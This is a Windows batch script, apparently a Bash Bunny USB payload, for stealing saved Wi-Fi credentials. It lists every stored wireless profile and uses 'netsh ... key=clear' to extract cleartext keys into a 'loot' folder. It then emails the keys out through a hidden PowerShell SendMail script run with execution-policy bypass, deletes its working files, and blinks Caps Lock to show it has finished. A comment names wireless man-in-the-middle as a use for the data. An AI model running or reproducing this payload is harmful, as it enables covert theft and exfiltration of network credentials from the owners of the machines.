@echo off

REM Creates directory compromised of computer name, date and time
REM %~d0 = path to this batch file. %COMPUTERNAME%, %date% and %time% pretty obvious
set dst=%~dp0\..\..\loot\WiFiProfiles\%COMPUTERNAME%_%date:~-4,4%%date:~-10,2%%date:~7,2%_%time:~-11,2%%time:~-8,2%%time:~-5,2%
mkdir %dst% >>nul

REM Set variable for the dynimic portions of the file, and include the file extension
FOR %%A IN (%Date:/=%) DO SET Today=%%A
REM Trim right white space, a maximum of 1 time (the final 1 in brackets represents max iterations)
for /l %%a in (1,1,1) do if "!Today:~-1!"==" " set Today=!Today:~0,-1!
SET dynpathname=%TODAY%_%COMPUTERNAME%_%USERNAME%.txt

REM Grab stored wireless profiles
REM Identify all of the SSID profiles on the system (netsh wlan show profiles will produce the available SSID profiles) and store them
REM The SSID profiles might be valuable if you are wanting to do a wireless MitM
set n=
for /f "skip=6 tokens=5 delims= " %%n in ('netsh wlan show profiles') DO @echo %%n >>%dst%\WiFiProfiles__%DYNPATHNAME%
REM Grab the stored wireless keys
REM The "key=clear" portion will unmask the available WiFi key (if one exists for that SSID)
set n=
for /f "skip=6 tokens=5 delims= " %%n in ('netsh wlan show profiles') DO @netsh wlan show profiles %%n key=clear| findstr /c:"Name" /c:"Network type" /c:"Authentication" /c:"Key Content" >>%dst%\WiFiKeys_%DYNPATHNAME%

REM e-mail out the Keys
copy %dst%\WiFiKeys_%DYNPATHNAME% %~dp0\..\..\payloads\library\mail.txt
for /f %%D in ('wmic volume get DriveLetter^, Label ^| find "BashBunny"') do %%D
cd %~dp0\..\..\payloads\library\
start /b /w powershell.exe -exec bypass -nologo -WindowStyle Hidden . .\SendMail.ps1
del %dst%\WiFiKeys_%DYNPATHNAME% %~dp0\..\..\payloads\library\mail.txt

REM Blink CAPSLOCK key
start /b /wait powershell.exe -nologo -WindowStyle Hidden -sta -command "$wsh = New-Object -ComObject WScript.Shell;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}')"

@cls
@exit

